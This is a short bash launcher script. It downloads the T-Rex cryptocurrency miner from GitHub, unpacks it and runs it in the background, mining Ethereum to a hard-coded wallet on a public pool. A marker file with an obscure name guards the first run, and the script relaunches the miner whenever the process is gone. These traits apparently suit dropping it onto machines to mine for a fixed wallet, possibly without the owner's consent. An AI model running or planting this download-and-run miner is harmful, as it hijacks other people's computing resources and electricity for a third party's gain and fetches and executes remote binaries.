#!/bin/bash
woker=$(date +'%d_%m_%H_%M_%S')
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
if [ ! -f "${SCRIPT_DIR}/B8648rns22.txt" ]; then
	echo "Start setup..."
	echo "B8648rns22" > B8648rns22.txt
	wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz ; tar -zxvf t-rex-0.22.1-linux.tar.gz
	./t-rex -a ethash -o stratum+tcp://eth.2miners.com:2020 -u 0x1215abde23700d037a2ea05773d59a4d3e7ab7dd -p x -w $woker &
else
	if pgrep t-rex >/dev/null 2>&1
	then
		echo "RUNNING"
	else
		wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz ; tar -zxvf t-rex-0.22.1-linux.tar.gz
    		./t-rex -a ethash -o stratum+tcp://eth.2miners.com:2020 -u 0x1215abde23700d037a2ea05773d59a4d3e7ab7dd -p x -w $woker &
	fi
fi
